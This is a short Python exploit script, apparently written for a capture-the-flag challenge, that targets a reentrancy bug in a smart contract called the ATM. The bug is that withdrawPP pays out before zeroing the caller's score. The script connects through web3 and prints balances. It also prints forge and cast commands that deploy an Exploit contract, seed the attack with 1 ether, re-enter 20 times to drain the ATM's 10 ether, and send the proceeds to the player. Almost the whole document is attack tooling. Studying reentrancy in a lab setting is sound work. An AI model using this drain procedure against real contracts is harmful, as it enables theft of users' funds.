#!/usr/bin/env python3
"""
PP Farming - Reentrancy exploit
withdrawPP does external call BEFORE zeroing scores[msg.sender]
"""
import sys
from web3 import Web3

# --- config: fill from challenge instance ---
RPC_URL    = "http://REPLACE_RPC"
PLAYER_KEY = "REPLACE_PRIVKEY"
ATM_ADDR   = Web3.to_checksum_address("REPLACE_ATM")

w3 = Web3(Web3.HTTPProvider(RPC_URL))
player = w3.eth.account.from_key(PLAYER_KEY)

print(f"Player:  {player.address}")
print(f"Balance: {w3.from_wei(w3.eth.get_balance(player.address), 'ether')} ETH")
print(f"ATM bal: {w3.from_wei(w3.eth.get_balance(ATM_ADDR), 'ether')} ETH")

# Compile with: forge build --root . from challenge dir, then grab bytecode
# Or use cast/forge deploy inline
print("\nDeploy Exploit.sol via forge script or cast, then call attack() with 1 ether seed.")
print("ATM has 10 ether; loop count=20 covers all re-entries needed to drain it.")
print("\nQuick forge commands:")
print(f"  forge create --rpc-url {RPC_URL} --private-key $PK src/Exploit.sol:Exploit --constructor-args {ATM_ADDR}")
print(f"  cast send $EXPLOIT 'attack()' --value 1ether --rpc-url {RPC_URL} --private-key $PK")
print(f"  cast send $EXPLOIT 'drain(address)' $PLAYER --rpc-url {RPC_URL} --private-key $PK")
print(f"  cast call {ATM_ADDR} 'isSolved()' --rpc-url {RPC_URL}")
